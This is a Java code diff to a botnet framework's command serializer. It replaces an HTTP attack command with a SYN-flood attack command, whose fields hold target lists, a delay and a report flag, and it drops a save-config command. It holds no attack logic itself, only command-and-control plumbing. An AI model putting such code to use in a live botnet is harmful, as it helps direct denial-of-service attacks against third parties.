@@ -26,7 +26,7 @@
 
 package com.acmutv.botnet.core.control.command.serial;
 
-import com.acmutv.botnet.core.attack.HttpAttack;
+import com.acmutv.botnet.core.attack.SynFloodAttack;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonGenerator;
@@ -75,23 +75,23 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
     gen.writeStringField("command", value.getScope().getName());
     if (value.getScope().isWithParams()) {
       switch (value.getScope()) {
-        case ATTACK_HTTP:
-          @SuppressWarnings("unchecked") final List<HttpAttack> httpAttacks = (List<HttpAttack>) value.getParams().get("attacks");
-          final Interval httpDelay = (Interval) value.getParams().get("delay");
-          final Boolean httpReport = (Boolean) value.getParams().get("report");
+        case ATTACK_SYNFLOOD:
+          @SuppressWarnings("unchecked") final List<SynFloodAttack> attacks = (List<SynFloodAttack>) value.getParams().get("attacks");
+          final Interval attackDelay = (Interval) value.getParams().get("delay");
+          final Boolean attackReport = (Boolean) value.getParams().get("report");
 
           gen.writeArrayFieldStart("attacks");
-          for (HttpAttack attack : httpAttacks) {
-            provider.findValueSerializer(HttpAttack.class).serialize(attack, gen, provider);
+          for (SynFloodAttack attack : attacks) {
+            provider.findValueSerializer(SynFloodAttack.class).serialize(attack, gen, provider);
           }
           gen.writeEndArray();
 
-          if (httpDelay != null) {
-            gen.writeStringField("delay", httpDelay.toString());
+          if (attackDelay != null) {
+            gen.writeStringField("delay", attackDelay.toString());
           }
 
-          if (httpReport != null) {
-            gen.writeBooleanField("report", httpReport);
+          if (attackReport != null) {
+            gen.writeBooleanField("report", attackReport);
           }
 
           break;
@@ -161,20 +161,6 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
 
           if (restartReport != null) {
             gen.writeBooleanField("report", restartReport);
-          }
-
-          break;
-
-        case SAVE_CONFIG:
-          final Interval saveConfigDelay = (Interval) value.getParams().get("delay");
-          final Boolean saveConfigReport = (Boolean) value.getParams().get("report");
-
-          if (saveConfigDelay != null) {
-            gen.writeStringField("delay", saveConfigDelay.toString());
-          }
-
-          if (saveConfigReport != null) {
-            gen.writeBooleanField("report", saveConfigReport);
           }
 
           break;
